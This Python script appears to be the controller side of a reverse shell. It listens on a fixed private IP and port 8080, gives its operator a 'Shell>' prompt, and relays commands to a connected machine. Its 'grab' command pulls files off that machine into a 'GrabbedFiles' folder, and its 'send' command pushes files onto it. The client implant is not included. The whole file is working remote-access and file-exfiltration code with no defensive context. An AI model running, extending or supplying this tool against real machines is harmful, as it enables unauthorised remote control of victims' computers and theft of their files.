import os
import socket


def connect():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("10.3.131.241",8080))
    print("="*53)
    print("[+] Listening for incoming TCP connection on port 8080")
    s.listen(1)
    conn, addr = s.accept()
    print("[+] We got a connection from ",addr)

    while True:
        print("=" * 53)
        command = input("Shell> ")
        if "terminate" in command:
            conn.send("terminate".encode())
            conn.close()
            break
        elif 'grab' in command:
            doGrab(conn, command, "grab")

        # command format: send*<destination path>*<File Name>
        # example: send*C:\Users\John\Desktop\*photo.jpeg
        # source file in Linux. Example: /root/Desktop/
        elif 'send' in command:
            sendCmd, destination, fileName = command.split("*")
            source = input("Source path: ")
            conn.send(command.encode())
            doSend(conn, source, destination, fileName)
        else:
            conn.send(command.encode())
            print(conn.recv(5000).decode())


def doGrab(conn, command, operation):
    conn.send(command.encode())

    if (operation == "grab"):
        grab, sourcePath = command.split("*")
        fileName = os.path.basename(sourcePath)
        saveDir = os.path.join(os.getcwd(), "Desktop", "GrabbedFiles")
        os.makedirs(saveDir, exist_ok=True)
        savePath = os.path.join(saveDir, f"grabbed_{fileName}")

        with open(savePath, 'ab') as f:
            while True:
                bits = conn.recv(5000)
                if bits.endswith(b'DONE'):
                    f.write(bits[:-4])
                    print("[+] Transfer Complete")
                    break
                if b'File not found' in bits:
                    print("[-] File not found")
                    break
                f.write(bits)
        print(f"[+] File saved as: {savePath}")

def doSend(conn, sourcePath, destinationPath, fileName):
    if os.path.exists(sourcePath + fileName):
        sourceFile = open(sourcePath + fileName, 'rb')
        packet = sourceFile.read(5000)
        while len(packet) > 0:
            conn.send(packet)
            packet = sourceFile.read(5000)
        conn.send('DONE'.encode())
        print("[+] Transfer Complete")
    else:
        conn.send("File not found".encode())
        print("[-] Unable to find the file")
        return

def main():
    connect()

main()
